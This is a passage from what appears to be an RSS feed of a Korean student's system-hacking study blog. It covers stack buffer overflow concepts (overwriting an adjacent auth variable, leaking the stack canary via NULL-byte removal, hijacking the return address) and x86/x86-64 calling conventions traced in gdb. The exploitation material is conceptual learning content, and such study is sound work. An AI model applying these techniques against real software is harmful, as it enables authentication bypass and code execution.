&lt;p&gt;즉, strncpy를 돌릴 때 16바이트를 초과하는 문자열을 전달한다면 temp 지역 변수를 담는 스택의 버퍼가 overflow 되면서 바로 그 밑에 할당된 auth 지역 변수의 데이터가 오염될 수 있다는 것이다.&lt;/p&gt;

&lt;p&gt;위 취약점을 이용해 실제 관리자 비밀번호가 아닌 아무 데이터나 입력하면서 auth 버퍼의 데이터가 1로 변경되도록 변조한다면 인증을 통과할 수 있을 것이다.&lt;/p&gt;

&lt;h2 id=&quot;3-데이터-유출&quot;&gt;3. 데이터 유출&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;C언어의 경우 문자열의 종결은 NULL byte로 표현되고, 스택에서 데이터를 읽어올 때 NULL byte 전까지 읽어옴&lt;/li&gt;
  &lt;li&gt;즉, 어떤 버퍼에 오버플로우를 일으킴 → 다른 버퍼와의 사이에 있는 NULL byte 모두 제거 → 해당 버퍼의 데이터 유출 가능&lt;/li&gt;
  &lt;li&gt;Stack Canary를 이런 식으로 덮어씌워서 다음 버퍼의 데이터가 유출되게끔 할 수 있겠다!&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;4-실행-흐름-조작&quot;&gt;4. 실행 흐름 조작&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;새로운 스택 프레임을 생성할 때, 이전 스택 프레임의 맨 꼭대기에 리턴 주소를 저장한다는 사실을 악용
    &lt;ul&gt;
      &lt;li&gt;[새로운 스택 프레임: 지역 변수들…]&lt;/li&gt;
      &lt;li&gt;[새로운 스택 프레임: SFP(이전 스택 프레임의 함수에서 사용하던 스택의 바닥 주소)]&lt;/li&gt;
      &lt;li&gt;[옛날 스택 프레임: Return Address]&lt;/li&gt;
      &lt;li&gt;순이라는 걸 잊지 말자!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;스택 버퍼 오버플로우를 일으켜, 리턴 주소를 조작해 원하는 프로세스가 실행되게끔 함&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 17 Aug 2022 14:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step5-2</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step5-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5</title>
        <description>&lt;h1 id=&quot;stage-5&quot;&gt;STAGE 5&lt;/h1&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;함수 호출 규약의 정의와 종류 알기&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdecl&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSV&lt;/code&gt; 호출 규약이 무엇인지 알기&lt;/li&gt;
  &lt;li&gt;다음 코스의 스택 버퍼 오버플로우의 위험성 알기&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-calling-convention&quot;&gt;1. Calling Convention&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;함수 호출 규약: 함수의 호출 및 반환에 대한 약속&lt;/li&gt;
  &lt;li&gt;한 함수 A에서 다른 함수 B를 호출하는 경우,
    &lt;ul&gt;
      &lt;li&gt;Caller(호출자): A
        &lt;ul&gt;
          &lt;li&gt;Caller의 Stack Frame, Return Address를 저장한다.&lt;/li&gt;
          &lt;li&gt;Caller는 Callee가 요구하는 인자를 전달해 줘야 한다.&lt;/li&gt;
          &lt;li&gt;Caller는 Callee의 실행이 종료될 때의 리턴값을 전달받아야 한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Callee(피호출자): B&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 호출 규약 적용의 주체: &lt;strong&gt;컴파일러&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;그러나 컴파일러를 사용하지 않고 어셈블리 코드를 만들거나, 어셈블리 코드를 이해하려면 Calling Convention을 알아야만 한다.&lt;/p&gt;

        &lt;p&gt;→ 시스템 해킹의 기본&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;2-함수-호출-규약의-종류&quot;&gt;2. 함수 호출 규약의 종류&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;컴파일러는 지원하는 호출 규약 중 CPU 아키텍처에 가장 적합한 것을 선핵한다.
    &lt;ul&gt;
      &lt;li&gt;x86(32bit): &lt;strong&gt;스택으로 인자 전달&lt;/strong&gt;; 레지스터로 Callee의 인자를 전달하기에는 레지스터 수가 너무 적음.&lt;/li&gt;
      &lt;li&gt;x86-64(64bit): &lt;strong&gt;레지스터로 인자 전달&lt;/strong&gt;(&lt;strong&gt;적은 수&lt;/strong&gt;라면), 인자가 &lt;strong&gt;너무 많다면 스택&lt;/strong&gt; 사용. 레지스터 수가 충분한 편.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그러나 사용하는 컴파일러의 종류가 달라질 경우, 동일 아키텍처 상에서라도 다른 호출 규약이 적용될 수 있다.
    &lt;ul&gt;
      &lt;li&gt;C언어 컴파일 시:
        &lt;ul&gt;
          &lt;li&gt;Windows-MSVC
            &lt;ul&gt;
              &lt;li&gt;x86-64에서 MSx64 calling convention 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Linux-gcc
            &lt;ul&gt;
              &lt;li&gt;x86-64에서 SYSTEM V calling convention 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;대표적인 Calling Convention의 종류:
    &lt;ul&gt;
      &lt;li&gt;x86 architecture:
        &lt;ul&gt;
          &lt;li&gt;cdecl&lt;/li&gt;
          &lt;li&gt;stdcall&lt;/li&gt;
          &lt;li&gt;fastcall&lt;/li&gt;
          &lt;li&gt;thiscall&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;x86-64 architecture:
        &lt;ul&gt;
          &lt;li&gt;SYSTEM V AMD64 ABI의 Calling Convention&lt;/li&gt;
          &lt;li&gt;MS ABI의 Calling Convention&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;3-x86호출-규약-cdecl&quot;&gt;3. x86호출 규약: cdecl&lt;/h1&gt;

&lt;h2 id=&quot;들어가기-전에&quot;&gt;들어가기 전에:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;x86아키텍처 → 적은 레지스터 → 레지스터에 여유 없음 → 스택을 통해 Caller가 Callee에게 인자 전달
    &lt;ul&gt;
      &lt;li&gt;인자 전달에 사용된 스택은 Caller가 정리한다.&lt;/li&gt;
      &lt;li&gt;스택을 통해 인자를 전달할 때, 마지막 인자부터 첫 번째 인자까지 거꾸로 스택에 push
        &lt;ul&gt;
          &lt;li&gt;당연하다; 스택은 LIFO구조로 가장 위에서부터 pop 하니까, 원하는 순서대로 인자를 전달하고 싶다면 인자를 스택에 그 역순으로 push 해줘야 컴퓨터가 정순으로 읽을 수 있다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;실습&quot;&gt;실습&lt;/h2&gt;

&lt;p&gt;cdecl calling convention을 직접 확인해 보기 위해 리눅스 환경에서 gcc를 이용해 c언어를 어셈블리 소스 파일로 컴파일해 보았다.&lt;/p&gt;

&lt;p&gt;컴파일한 코드는 단순히 Caller에서 Callee에게 1, 2를 인자로 넘겨주는 동작을 하는 코드였다.&lt;/p&gt;

&lt;p&gt;컴파일 결과로 도출된 어셈블리어는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee 함수의 어셈블리 코드와 Caller 함수의 어셈블리 코드를 확인할 수 있었다. Caller 내부에서 Callee를 호출했으므로 해당 동작에 집중해 보자.&lt;/p&gt;

&lt;p&gt;Caller에서 Callee에게 인자를 전달할 때, 코드 상에서는 Callee(1, 2)로 전달했다. 그러나 어셈블리 코드 상에서는 arg2인 2가 먼저 push되고, arg1인 1이 나중에 push되는 것을 볼 수 있다. 즉, x86 architecture calling convention의 주요 특징인 &lt;strong&gt;‘Callee의 인자는 Caller가 스택에 역순으로 전달한다’&lt;/strong&gt;가 두드러졌다.&lt;/p&gt;

&lt;p&gt;또한 Callee를 호출하고, Callee가 리턴된 이후 돌아온 코드 플로우에서 Caller의 행동도 눈여겨볼 만하다. esp에 8을 더함으로써(스택의 크기를 메모리 주소 8만큼 줄인다) &lt;strong&gt;스택을 정리하는 행위&lt;/strong&gt;를 확인할 수 있기 때문이다. 인자를 두 개 전달했으므로 각각 int 형 4byte씩 8byte가 늘어나 있던 스택을 Callee를 호출하기 직전의 크기로 돌려놓은 것이다.&lt;/p&gt;

&lt;p&gt;스택 정리와 관련해, Callee의 행동도 확인해 두자. Callee는 스택에 아무런 조작도 가하지 않고 리턴한다. 즉, x86 architecture의 calling convention 중 &lt;strong&gt;cdecl calling convention은 Callee가 아닌 Caller가 스택을 정리한다는 점을 확인할 수 있다.&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-x86-64-호출-규약-sysv&quot;&gt;4. x86-64 호출 규약: SYSV&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;리눅스는 SYSTEM V(SYSV) Application Binary Interface(ABI)를 기반으로 만들어졌다.
    &lt;ul&gt;
      &lt;li&gt;SYSV ABI란? &lt;a href=&quot;https://wiki.osdev.org/System_V_ABI&quot;&gt;[자세한 설명]&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;A set of specifications that detail &lt;a href=&quot;https://wiki.osdev.org/Calling_Conventions&quot;&gt;calling conventions&lt;/a&gt;, &lt;a href=&quot;https://wiki.osdev.org/Object_Files&quot;&gt;object file formats&lt;/a&gt;, &lt;a href=&quot;https://wiki.osdev.org/Executable_Formats&quot;&gt;executable file formats&lt;/a&gt;, dynamic linking semantics, and much more for systems that complies with the &lt;em&gt;X/Open Common Application Environment Specification&lt;/em&gt; and the &lt;em&gt;System V Interface Definition.&lt;/em&gt;&lt;/li&gt;
          &lt;li&gt;ELF 포맷, 링킹 방법, 함수 호출 규약 등의 내용을 가지고 있음&lt;/li&gt;
          &lt;li&gt;그 외 위에 명시된 Specification/Definition을 이용해 컴파일되는 시스템 전용 정보를 가지고 있음&lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;즉, 컴파일과 매우 밀접한 연관 → 리눅스의 바이너리 파일들은 무조건 SYSV ABI와 연관되어 있음&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%201.jpeg&quot; alt=&quot;실제로 file 명령어를 이용해 리눅스의 바이너리 파일들의 종류(타입)을 확인해 본 결과. SYSV에 명시된 규약을 따라 컴파일된 바이너리임을 알 수 있다.&quot; /&gt;&lt;/p&gt;

            &lt;p&gt;실제로 file 명령어를 이용해 리눅스의 바이너리 파일들의 종류(타입)을 확인해 본 결과. SYSV에 명시된 규약을 따라 컴파일된 바이너리임을 알 수 있다.&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SYSV에서 정의된 함수 호출 규약:
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;6개의 인자를 RDI, RSI, RDX, RCX, R8, R9에 순서대로 저장해 전달한다.&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;64bit이므로 레지스터 수가 충분해서 웬만큼 감당 가능한 수의 인자면 레지스터에 담아 전달한댔다!&lt;/em&gt;&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;즉, 더 많은 인자를 전달해야 할 때는 스택을 추가로 쓴다.&lt;/em&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Caller에서&lt;/strong&gt; 인자 전달에 사용된 &lt;strong&gt;스택을 정리&lt;/strong&gt;한다.&lt;/li&gt;
      &lt;li&gt;함수의 반환 값은 RAX로 전달한다. 만일 syscall callee라면 해당 callee의 종류를 RAX로 지정해 call한다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SYSV Calling Convention을 gdb로 자세히 알아보자.&lt;/p&gt;

&lt;h2 id=&quot;gdb로-sysv-calling-convention-알아보기&quot;&gt;GDB로 SYSV Calling Convention 알아보기&lt;/h2&gt;

&lt;h3 id=&quot;코드-컴파일&quot;&gt;코드 컴파일&lt;/h3&gt;

&lt;p&gt;아래와 같은 코드를 컴파일하여 실행해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;컴파일 옵션은 아래와 같았다.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-asynchronous-unwind-tables&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-masm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;intel &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-fno-omit-frame-pointer&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sysv sysv.c &lt;span class=&quot;nt&quot;&gt;-fno-pic&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;인자-전달&quot;&gt;인자 전달&lt;/h3&gt;

&lt;p&gt;이후 sysv에 gdb를 붙여 실행하고 중단점을 caller에 설정해(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b caller&lt;/code&gt;) 중단점까지 실행한다.(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;실행 결과 아래와 같은 Context를 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Caller는 Callee에게 전달할 인자를 거꾸로 저장한다. 혹시라도 인자를 6개 초과하여 줄 때를 대비해, 즉 스택을 사용할 때를 대비해 전달할 인자를 거꾸로 저장하는 것 같았다.(추측)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+10&amp;gt;&lt;/code&gt;~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+37&amp;gt;&lt;/code&gt; 에서는 인자를 레지스터에 저장하지만, 7번째 인자를 저장하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+8&amp;gt;&lt;/code&gt; 에서는 스택에 push하는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 Callee 함수를 호출하기 전까지 실행해 보자. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b *caller+47&lt;/code&gt; 로 중단점을 걸고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 명령어로 해당 중단점까지 실행하면 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위의 REGISTER Context를 확인하면 rdi, rsi, rdx, rcx, r8, r9의 레지스터에 전달하고자 하는 인자가 들어가 있고, RSP즉 스택의 맨 꼭대기에 레지스터에 들어가지 못한 인자가 담겨 있음을 볼 수 있다.&lt;/p&gt;

&lt;p&gt;(그러고 보니, gdb pwndbg의 register context에 나열된 레지스터 중 앞에 *가 붙은 건 함수의 인자, 스택과 관련된 레지스터였구나!)&lt;/p&gt;

&lt;h3 id=&quot;반환-주소--스택-프레임-저장&quot;&gt;반환 주소 &amp;amp; 스택 프레임 저장&lt;/h3&gt;

&lt;p&gt;이제 si 명령어로 Callee의 내부로 들어가 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;무엇보다 눈에 띄는 건 STACK context에서 확인할 수 있는 스택 구조이다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caller+52&lt;/code&gt;, 즉 Callee가 리턴한 후 이어서 수행되어야 할 인스트럭션의 주소가 스택 꼭대기에 저장되어 있는 형태.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2-2/#/&quot;&gt;이전&lt;/a&gt;에 공부했던 것처럼 Callee 함수의 스택 프레임이 생성되기 직전에 Callee가 리턴되고 코드 플로우가 이어져야 할 인스트럭션의 주소가 스택에 push된다는 것을 상기할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Callee 함수의 prologue.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp&lt;/code&gt; 를 통해 Caller의 rbp를 저장하고, 스택 꼭대기(rsp)의 주소를 스택 밑바닥(rbp)로 설정해 현재 함수의 스택 프레임을 만드는 모습을 볼 수 있다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이후 Callee가 리턴되면 저장되었던 Caller의 rbp를 꺼내고, 이어서 수행될 인스트럭션의 주소를 꺼내면서 Caller의 스택 프레임으로 돌아갈 수 있다.&lt;/p&gt;

        &lt;p&gt;+) rbp는 스택 프레임의 밑바닥을 가리키는 포인터이기 때문에 SFP(Stack Frame Pointer)라고도 부른다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%206.jpeg&quot; alt=&quot;push rbp가 수행되기 직전의 스택 상태. 아직 Caller의 rbp가 저장되지 않았다.&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;push rbp가 수행되기 직전의 스택 상태. 아직 Caller의 rbp가 저장되지 않았다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%207.jpeg&quot; alt=&quot;push rbp가 수행된 직후의 스택 상태. rsp에 현재 rbp의 값이 저장되어 있는 것을 볼 수 있다.&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;push rbp가 수행된 직후의 스택 상태. rsp에 현재 rbp의 값이 저장되어 있는 것을 볼 수 있다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;새로운-스택-프레임-할당&quot;&gt;새로운 스택 프레임 할당&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp&lt;/code&gt; 다음 인스트럭션인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp, rsp&lt;/code&gt; 를 실행해 보자. 즉, rsp 값을 rbp에 넣음으로써 &lt;strong&gt;Callee를 위한 새로운 스택 프레임을 할당&lt;/strong&gt;하는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%208.jpeg&quot; alt=&quot;rsp와 rbp가 일치하는 상황인 것을 확인할 수 있다. 이렇게 새로운 스택 프레임의 기반이 완성된다!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rsp와 rbp가 일치하는 상황인 것을 확인할 수 있다. 이렇게 새로운 스택 프레임의 기반이 완성된다!&lt;/p&gt;

&lt;p&gt;만일 Callee에서 지역 변수를 선언했다면 스택에 지역 변수를 저장해야 하기 때문에 rsp의 값을 뺄 텐데, 지역 변수를 선언하지 않기 때문에 아래 인스트럭션에서 볼 수 있듯 rsp의 값을 빼지 않고 그대로 진행된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;어? 그런데 이상한 점이 있다. Callee 함수를 다시 보자.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Callee 함수는 ret이라는 지역 변수를 선언한다! 그런데 Callee 함수의 인스트럭션을 보면 rsp에는 변동이 없다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;그 이유는 gcc의 컴파일 방식 때문이었다.&lt;/strong&gt; 어떤 &lt;strong&gt;지역 변수가 오로지 반환 값을 저장하는 용도로만&lt;/strong&gt; 사용될 경우, gcc는 &lt;strong&gt;스택을 할당하지 않으며 rax를 직접 사용&lt;/strong&gt;한다는 것.&lt;/p&gt;

&lt;p&gt;효율적인 자원 사용을 위한 프로그래머들의 노력을 정말 존경하지만, 그로 인해 발생하는 이런 예외들을 보면 머리를 쥐어뜯게 된다(…)&lt;/p&gt;

&lt;h3 id=&quot;반환값-전달&quot;&gt;반환값 전달&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee 함수의 전체 인스트럭션을 살펴 보자. 계속해서 주어진 인자들을 더하다가, 마지막 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+79&amp;gt;&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+91&amp;gt;&lt;/code&gt; 에서 &lt;strong&gt;리턴할 값을 rax에 저장하고, 함수를 마무리&lt;/strong&gt;짓고 있다. 즉, &lt;strong&gt;함수의 Epilogue를 확인&lt;/strong&gt;할 수 있다. 이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+91&amp;gt;&lt;/code&gt;, 즉 함수를 리턴하는 인스트럭션에 중단점을 걸고 rax를 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee에 전달했던 7개 인자의 합을 확인할 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;반환&quot;&gt;반환&lt;/h3&gt;

&lt;p&gt;반환은 저장해뒀던 Caller의 스택 프레임과 반환 인스트럭션 주소를 꺼내는 과정이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee 함수가 지역 변수를 선언하지 않았기 때문에(리턴값을 담는 변수 제외) 스택 프레임을 만들지 않았고, 따라서 단순히 pop rbp로만 스택 프레임을 꺼내고 끝나는 것을 확인할 수 있다. 그러나, 일반적인 경우-즉, 지역 변수를 선언하는 경우에는 스택 프레임이 생성되었기 때문에 leave로 스택 프레임을 꺼낸다는 점을 꼭 염두에 두자.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;leave는 mov rsp, rbp&lt;/td&gt;
          &lt;td&gt;pop rbp 를 합쳐 둔 명령어이다.&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;즉, 확보된 스택 공간을 버리고 이전 스택 프레임의 rbp 꺼내 오는 명령어이다.&lt;/li&gt;
  &lt;li&gt;이를 다시 말하면 현재 스택 프레임을 버리고 이전 스택 프레임을 꺼내는 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;스택 프레임을 꺼낸 이후에는 ret으로 Caller에게 복귀한다. 복귀할 때 변화하는 것은 앞서 설명했듯 rbp와 rip이므로 ret 인스트럭션을 수행한 직후 그 둘을 살펴보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2013.jpeg&quot; alt=&quot;rbp가 Caller의 rbp로 바뀐 모습.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rbp가 Caller의 rbp로 바뀐 모습.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2014.jpeg&quot; alt=&quot;rip가 리턴 주소로 설정되어 있는 모습.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rip가 리턴 주소로 설정되어 있는 모습.&lt;/p&gt;

&lt;h1 id=&quot;5-부록-함수-호출-규약&quot;&gt;5. 부록-함수 호출 규약&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;x86 함수 호출 규약&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;함수호출규약&lt;/th&gt;
      &lt;th&gt;사용 컴파일러&lt;/th&gt;
      &lt;th&gt;인자 전달 방식&lt;/th&gt;
      &lt;th&gt;스택 정리&lt;/th&gt;
      &lt;th&gt;적용&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;stdcall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;WINAPI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cdecl&lt;/td&gt;
      &lt;td&gt;GCC, MSVC&lt;/td&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;일반 함수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;fastcall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;ECX, EDX&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;최적화된 함수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;thiscall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;ECX(인스턴스),Stack(인자)&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;클래스의 함수&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;x86-64 함수 호출 규약&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;함수호출규약&lt;/th&gt;
      &lt;th&gt;사용 컴파일러&lt;/th&gt;
      &lt;th&gt;인자 전달 방식&lt;/th&gt;
      &lt;th&gt;스택 정리&lt;/th&gt;
      &lt;th&gt;적용&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MS ABI&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;RCX, RDX, R8, R9&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;일반 함수,Windows Syscall&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;System ABI&lt;/td&gt;
      &lt;td&gt;GCC&lt;/td&gt;
      &lt;td&gt;RDI, RSI, RDX, RCX, R8, R9, XMM0–7&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;일반 함수&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        <pubDate>Fri, 12 Aug 2022 21:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step5-1</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step5-1</guid>
      </item>
    
      <item>
        <title>System Hackig Step 4-2: Shell_basic</title>
        <description>&lt;h1 id=&quot;stage-4-2-shell_basic&quot;&gt;STAGE 4-2: Shell_basic&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;이번 스테이지는 문제를 자율적으로 풀어보는 스테이지이다.&lt;/li&gt;
  &lt;li&gt;직전 스테이지에서 문제를 해결했던 방식으로 접근하며 문제 풀이 사고방식을 체화하는 것을 목표로 삼았다.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;문제-풀이-과정-설정하기&quot;&gt;문제 풀이 과정 설정하기&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;코드의 내용 확인&lt;/li&gt;
